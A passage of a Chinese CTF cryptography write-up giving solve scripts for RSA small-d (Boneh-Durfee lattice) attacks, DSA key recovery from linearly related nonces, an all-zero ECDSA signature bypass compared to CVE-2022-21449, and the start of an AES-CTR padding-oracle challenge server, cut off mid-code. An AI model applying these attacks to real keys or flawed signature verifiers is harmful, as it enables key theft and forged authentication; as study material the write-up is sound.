python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line"></span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line"></span><br><span class="line">    f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">    G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">        base = N ^ (m - i) * f ^ i</span><br><span class="line">        <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line"></span><br><span class="line">    B, monomials = G.coefficient_matrix()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line"></span><br><span class="line">    factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line"></span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line"></span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, <span class="number">1</span> / factor)</span><br><span class="line"></span><br><span class="line">    H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B * monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">            H.pop()</span><br><span class="line">        <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">            roots = []</span><br><span class="line">            <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            <span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = </span><br><span class="line">e = </span><br><span class="line">c = </span><br><span class="line">P = Zmod(ZZ(e))[<span class="string">&quot;k,s&quot;</span>]</span><br><span class="line">k, s = P.gens()</span><br><span class="line">f = <span class="number">1</span> + k * (n - s)</span><br><span class="line">rs = small_roots(f, (<span class="number">2</span>**<span class="number">540</span>, <span class="number">2</span>**<span class="number">1025</span>), m=<span class="number">4</span>, d=<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(rs)</span><br><span class="line">k, s = <span class="built_in">map</span>(<span class="built_in">int</span>, rs[<span class="number">0</span>])</span><br><span class="line">phi = n - s</span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure><h2 id="0x1-2-Boneh-Durfee的碎碎念"><a href="#0x1-2-Boneh-Durfee的碎碎念" class="headerlink" title="0x1.2 Boneh-Durfee的碎碎念"></a>0x1.2 Boneh-Durfee的碎碎念</h2><p>从上面的题也可以看出，Boneh-Durfee的核心就是Multivariate Coppersmith，也即多元Coppersmith。对于RSA公钥方程：<br>$$<br>ed\equiv1\pmod {\phi(n)}<br>$$<br>去掉取模符号：<br>$$<br>ed&#x3D;k\phi(n)+1<br>$$<br>同时模e:<br>$$<br>k\phi(n)+1&#x3D;0\pmod e<br>$$<br>令$s &#x3D; p+q-1$，则可以化成：<br>$$<br>f(x,y) &#x3D; 1+x(n-y)<br>$$<br>可得$f(k,s)\equiv 0\pmod e$，其中(k, s)是f 的一个小根。</p><h1 id="0x02-Not-Wiener-Another"><a href="#0x02-Not-Wiener-Another" class="headerlink" title="0x02. Not Wiener(Another)"></a>0x02. Not Wiener(Another)</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random, os</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line">flag=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">x = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_key</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        q = getPrime(<span class="number">160</span>)</span><br><span class="line">        p = <span class="number">2</span> * getPrime(<span class="number">1024</span>-<span class="number">160</span>) * q+<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(p):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    h = random.randint(<span class="number">1</span>, p - <span class="number">1</span>)</span><br><span class="line">    g = powmod(h,(p-<span class="number">1</span>)//q, p)</span><br><span class="line">    y=<span class="built_in">pow</span>(g,x,p)</span><br><span class="line">    <span class="keyword">return</span> p,q,g,y</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cry</span>():</span><br><span class="line">    a =</span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    q = getPrime(<span class="number">512</span>)</span><br><span class="line">    d = getPrime(<span class="number">280</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    e = inverse(d, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">    c = <span class="built_in">pow</span>(a, e, n)</span><br><span class="line">    <span class="keyword">return</span> n,e,c</span><br><span class="line"></span><br><span class="line">p,q,g,y=gen_key()</span><br><span class="line">k1 = random.randint(<span class="number">1</span>, q-<span class="number">1</span>)</span><br><span class="line">h1 = bytes_to_long(sha1(os.urandom(<span class="number">20</span>)).digest())</span><br><span class="line">r1 = <span class="built_in">pow</span>(g, k1, p) % q</span><br><span class="line">s1 = ((h1 + x*r1) * invert(k1, q))% q</span><br><span class="line"></span><br><span class="line">n,e,c= cry()</span><br><span class="line"></span><br><span class="line">a=</span><br><span class="line">b= <span class="number">17474742587088593627</span></span><br><span class="line">k2 = a*k1 + b</span><br><span class="line">h2 = bytes_to_long(sha1(os.urandom(<span class="number">20</span>)).digest())</span><br><span class="line">r2 = <span class="built_in">pow</span>(g, k2, p) % q</span><br><span class="line">s2 = ((h2 + x*r2) * invert(k2, q)) % q</span><br><span class="line"><span class="built_in">print</span>(n,e,c)</span><br><span class="line"><span class="built_in">print</span>(p,q,g,y)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;h1:%s r1:%s s1:%s&quot;</span>%(h1,r1,s1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;h2:%s r2:%s s2:%s&quot;</span>%(h2,r2,s2))</span><br></pre></td></tr></table></figure><p>题目嵌套了标准Boneh-Durfee attack 和线性DSA攻击。</p><p>由cry()函数得之用的RSA加密的a, 同时d较小，用标准Boneh-Durfee attack就能求出a。</p><p>接下来是求线性关系的步骤。已知：<br>$$<br>(h_1+xr_1)k^{-1}\equiv s_1\pmod q<br>(h_2+xr_2)(ak+b)^{-1}\equiv s_2\pmod q<br>$$<br>一通相消得：<br>$$<br>(s_1k-h_1)r_2-(s_2(ak+b)-h_2)r1\equiv0\pmod q<br>$$<br>可以求k。得到k再带入一个式子求x，也就是flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a =     <span class="comment">#Boneh-Durfee</span></span><br><span class="line">p= <span class="number">161310487790785086482919800040790794252181955976860261806376528825054571226885460699399582301663712128659872558133023114896223014064381772944582265101778076462675402208451386747128794418362648706087358197370036248544508513485401475977401111270352593919906650855268709958151310928767086591887892397722958234379</span></span><br><span class="line">q= <span class="number">1115861146902610160756777713087325311747309309771</span></span><br><span class="line">g= <span class="number">61073566757714587321114447684333928353300944355112378054603585955730395524359123615359185275743626350773632555967063692889668342544616165017003197599818881844811647270423070958521148291118914198811187731689123176313367399492561288350530256722898205674043032421874788802819858438796795768177550638273020791962</span></span><br><span class="line">y= <span class="number">23678147495254433946472657196764372220306841739888385605070426528738230369489739339976134564575544246606937803367113623097260181789372915552172469427842482448570540429192377881186772226796452797182435452490307834205012154495575570994963829345053331967442452842152258650027916313982835119514473311305158299360</span></span><br><span class="line">(h1, r1, s1) = <span class="number">535874494834828755542711401117152397489711233142</span>, <span class="number">117859946800380767356190121030392492081340616512</span>, <span class="number">26966646740134065096660259687229179143947213779</span></span><br><span class="line">(h2, r2, s2) = <span class="number">236574518096866758760287021848258048065293279716</span>, <span class="number">863199000523521111517835459866422731857447792677</span>, <span class="number">517924607931342012033031470185302567344725962419</span></span><br><span class="line"></span><br><span class="line">b = <span class="number">17474742587088593627</span></span><br><span class="line"></span><br><span class="line">k = (h1*r2-h2*r1 + b*s2*r1)*inverse(s1*r2-a*s2*r1,q) % q</span><br><span class="line">x = (k*s1 - h1)*inverse(r1,q) % q</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(x))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="0x03-Or1cle"><a href="#0x03-Or1cle" class="headerlink" title="0x03. Or1cle"></a>0x03. Or1cle</h1><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202402012336494.png" alt="image-20240201233635373"></p><p>目的是拿到xenny的签名。一同操作后发现hex报错能弹源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> get_signature</span><br><span class="line"><span class="number">2.</span> get_flag</span><br><span class="line"><span class="number">3.</span> gift</span><br><span class="line"><span class="number">4.</span> exit</span><br><span class="line"><span class="number">2</span></span><br><span class="line">sign: the</span><br><span class="line">An error occurred <span class="keyword">in</span> /app/task.py at line <span class="number">33</span> <span class="keyword">in</span> verify: invalid literal <span class="keyword">for</span> <span class="built_in">int</span>() <span class="keyword">with</span> base <span class="number">16</span>: <span class="string">b&#x27;the&#x27;</span></span><br><span class="line"><span class="number">23</span>: self.P = self.d*secp256k1.G</span><br><span class="line"><span class="number">24</span>:</span><br><span class="line"><span class="number">25</span>: <span class="keyword">def</span> <span class="title function_">signature</span>(<span class="params">self,msg</span>):</span><br><span class="line"><span class="number">26</span>: h = <span class="built_in">int</span>(hashlib.sha256(msg).hexdigest(),<span class="number">16</span>)</span><br><span class="line"><span class="number">27</span>: k = h^self.d</span><br><span class="line"><span class="number">28</span>: r = (k*secp256k1.G).x</span><br><span class="line"><span class="number">29</span>: s = inverse(k,secp256k1.q) * (h + r*self.d) % secp256k1.q</span><br><span class="line"><span class="number">30</span>: <span class="keyword">return</span> <span class="string">&#x27;%064x%064x&#x27;</span> % (r, s)</span><br><span class="line"><span class="number">31</span>:</span><br><span class="line"><span class="number">32</span>: <span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">self,z, signature</span>):</span><br><span class="line"><span class="number">33</span>: r, s = <span class="built_in">int</span>(signature[:<span class="number">64</span>], <span class="number">16</span>), <span class="built_in">int</span>(signature[<span class="number">64</span>:], <span class="number">16</span>)</span><br><span class="line"><span class="number">34</span>: z = <span class="built_in">int</span>(hashlib.sha256(z).hexdigest(), <span class="number">16</span>)</span><br><span class="line"><span class="number">35</span>: s_inv = <span class="built_in">pow</span>(s, secp256k1.q - <span class="number">2</span>, secp256k1.q)</span><br><span class="line"><span class="number">36</span>: u1 = (z * s_inv) % secp256k1.q</span><br><span class="line"><span class="number">37</span>: u2 = (r * s_inv) % secp256k1.q</span><br><span class="line"><span class="number">38</span>: point = u1 * secp256k1.G + u2 * self.P</span><br><span class="line"><span class="number">39</span>: <span class="keyword">return</span> point.x == r</span><br><span class="line"><span class="number">40</span>:</span><br><span class="line"><span class="number">41</span>: banner = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">42: _  __                                       __________        ___________</span></span><br><span class="line"><span class="string">43: | |/_/__ ___  ___  __ __    __              /\____;;___\      |          |</span></span><br><span class="line"><span class="string">sth error</span></span><br></pre></td></tr></table></figure><p>观察到r s没加非0校验，和CVE-2022-21449一样，非预期直接秒</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202402012338963.png" alt="[FR$~ZD]A3TJP23Q$5CP$UO"></p><blockquote><p>做出这道真不是纯运气，要不是之前辛苦复现，不然这道题拿不下来。</p></blockquote><h1 id="0x04-Or2cle"><a href="#0x04-Or2cle" class="headerlink" title="0x04. Or2cle"></a>0x04. Or2cle</h1> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> Counter</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">FLAG = <span class="string">b&#x27;fake_flag&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Proof</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">S</span>(<span class="params">self,n</span>):</span><br><span class="line">        factors = <span class="built_in">set</span>()</span><br><span class="line">        <span class="keyword">while</span> n % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            factors.add(<span class="number">2</span>)</span><br><span class="line">            n //= <span class="number">2</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="built_in">int</span>(n**<span class="number">0.5</span>) + <span class="number">1</span>, <span class="number">2</span>):</span><br><span class="line">            <span class="keyword">while</span> n % i == <span class="number">0</span>:</span><br><span class="line">                factors.add(i)</span><br><span class="line">                n //= i</span><br><span class="line">        <span class="keyword">if</span> n &gt; <span class="number">2</span>:</span><br><span class="line">            factors.add(n)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> factors</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Y</span>(<span class="params">self,n</span>):</span><br><span class="line">        <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        result = n</span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> self.S(n):</span><br><span class="line">            result *= (<span class="number">1</span> - <span class="number">1</span> / p)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">proof</span>(<span class="params">self,n</span>):</span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, m+<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, l+<span class="number">1</span>):</span><br><span class="line">                    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, k+<span class="number">1</span>):</span><br><span class="line">                        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, j+<span class="number">1</span>):</span><br><span class="line">                            <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, i+<span class="number">1</span>):</span><br><span class="line">                                <span class="keyword">for</span> g <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, h+<span class="number">1</span>):</span><br><span class="line">                                    <span class="keyword">for</span> f <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, g+<span class="number">1</span>):</span><br><span class="line">                                        <span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, f+<span class="number">1</span>):</span><br><span class="line">                                            <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e+<span class="number">1</span>):</span><br><span class="line">                                                <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, d+<span class="number">1</span>):</span><br><span class="line">                                                    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, c+<span class="number">1</span>):</span><br><span class="line">                                                        <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, b+<span class="number">1</span>):</span><br><span class="line">                                                            res +=  b//a*(self.Y(a)) <span class="comment"># Euler function </span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Harukii_Oracle</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,key</span>):</span><br><span class="line">        self.k  = key</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">self, plaintext</span>):</span><br><span class="line">        block_size = randint(<span class="number">1</span>,<span class="built_in">len</span>(plaintext)-<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(plaintext) &lt;  block_size :</span><br><span class="line">            <span class="keyword">return</span> plaintext</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            padding_length = <span class="built_in">len</span>(plaintext) // <span class="number">16</span></span><br><span class="line">            padding_byets = <span class="built_in">bytes</span>([padding_length])</span><br><span class="line">            plaintext = plaintext.replace(padding_byets,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">            p = plaintext[:<span class="number">16</span>]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span> , padding_length+<span class="number">1</span>):</span><br><span class="line">                p += padding_byets + plaintext[<span class="number">16</span>*i:<span class="number">16</span>*(i+<span class="number">1</span>)]</span><br><span class="line">            <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self,plaintext</span>):</span><br><span class="line">        aes = AES.new(self.k,mode=AES.MODE_CTR,counter=Counter.new(<span class="number">128</span>))</span><br><span class="line">        chipertext = aes.encrypt(self.pad(plaintext))</span><br><span class="line">        <span class="keyword">return</span> chipertext</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gift</span>(<span class="params">self,ciphertext</span>):</span><br><span class="line">        aes = AES.new(self.k,mode=AES.MODE_CTR,counter=Counter.new(<span class="number">128</span>))</span><br><span class="line">        plaintext = aes.decrypt(ciphertext)</span><br><span class="line">        padding_length = <span class="built_in">len</span>(plaintext) // <span class="number">16</span></span><br><span class="line">        padding_bytes = <span class="built_in">bytes</span>([padding_length])</span><br><span class="line">        <span class="keyword">return</span> plaintext.count(padding_bytes) == padding_length</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">Menu = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">1. get flag</span></span><br><span class="line"><span class="string">2. gift</span></span><br><span class="line"><span class="string">3. exit</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">task</span>(<span class="params">client_socket</span>):</span><br><span class="line">    client_socket.settimeout(<span class="number">3600</span>)</span><br><span class="line">    s = <span class="built_in">str</span>((getPrime(<span class="number">128</span>)))</span><br><span class="line">    client_socket.send(<span class="string">f&quot;s : <span class="subst">&#123;s&#125;</span>\n&quot;</span>.encode())</span><br><span class="line">    client_socket.send(<span class="string">&quot;Give me a hash: &quot;</span>.encode())</span><br><span class="line">    <span class="built_in">hash</span> = client_socket.recv(<span class="number">1024</span>)[:-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">hash</span> = <span class="built_in">int</span>(<span class="built_in">hash</span>,<span class="number">16</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;if hash != int(sha256(str(Proof.proof(s)).encode()).hexdigest(),16):</span></span><br><span class="line"><span class="string">        client_socket.send(&quot;: C&quot;.encode())</span></span><br><span class="line"><span class="string">        exit(-1)&#x27;&#x27;&#x27;</span></span><br><span class="line">    key = randbytes(<span class="number">16</span>)</span><br><span class="line">    YSGS = Harukii_Oracle(key=key)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            client_socket.send(Menu.encode())</span><br><span class="line">            choice = client_socket.recv(<span class="number">1024</span>).decode().strip()</span><br><span class="line">            <span class="keyword">if</span> choice == <span class="string">&#x27;1&#x27;</span> :</span><br><span class="line">                enc_flag = base64.b64encode(YSGS.encrypt(FLAG))</span><br><span class="line">                client_socket.send(<span class="string">f&quot;This is Your flag <span class="subst">&#123;enc_flag&#125;</span>&quot;</span>.encode())</span><br><span class="line">            <span class="keyword">elif</span> choice == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">                c = client_socket.recv(<span class="number">1024</span>)[:-<span class="number">1</span>]</span><br><span class="line">                <span class="keyword">if</span> YSGS.gift(c):</span><br><span class="line">                    client_socket.send(<span class="string">&quot;Dec successfully&quot;</span>.encode())</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    client_socket.send(<span class="string">&quot;Dec faild&quot;</span>.encode())</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                exit(-<span 